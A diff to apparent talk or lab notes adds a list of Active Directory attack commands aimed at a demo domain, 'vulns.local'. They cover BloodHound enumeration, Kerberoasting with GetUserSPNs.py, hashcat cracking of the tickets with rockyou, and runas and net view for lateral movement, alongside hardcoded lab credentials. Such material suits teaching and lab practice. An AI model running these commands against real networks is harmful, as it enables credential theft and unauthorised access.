@@ -62,3 +62,22 @@ $password = ConvertTo-SecureString "Password!@12" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("vulns.local\chrisd", $password)
 Enter-PSSession -ComputerName WIN-4JFNT305Q5J.vulns.local -Credential $creds -Authentication Negotiate
 ```
+
+### Additional commands given during talk:
+
+``` powershell
+Invoke-BloodHound -CollectionMethod All
+
+py -3 GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.96.101 vulns.local/chrisd:'Password!@12' -request 
+
+.\hashcat.exe -m 13100 -a 0 .\spns.txt --potfile-disable -r .\rules\best64.rule --force -O -w 4 --opencl-device-types 1,2 .\rockyou.txt
+
+runas /noprofile /user:vulns_svc@vulns.local cmd
+
+echo $env:LOGONSERVER
+echo %LOGONSERVER%
+
+net view \\WIN-4JFNT305Q5J
+
+runas /noprofile /user:remote_employee@vulns.local cmd
+```
